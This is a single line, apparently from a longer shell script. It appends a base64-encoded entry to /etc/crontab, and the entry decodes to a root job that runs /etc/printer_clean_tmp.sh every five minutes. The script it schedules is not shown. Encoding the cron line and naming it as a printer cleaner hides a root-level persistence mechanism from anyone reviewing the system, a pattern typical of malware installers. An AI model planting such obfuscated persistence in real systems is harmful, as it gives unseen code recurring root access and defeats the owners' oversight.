...
grep printer_clean_tmp /etc/crontab  || (echo Installing cron cleanr; echo "Ki81ICoJKiAqICoJcm9vdAkvYmluL2Jhc2ggL2V0Yy9wcmludGVyX2NsZWFuX3RtcC5zaAoK"|base64 -d |tee -a /etc/crontab )
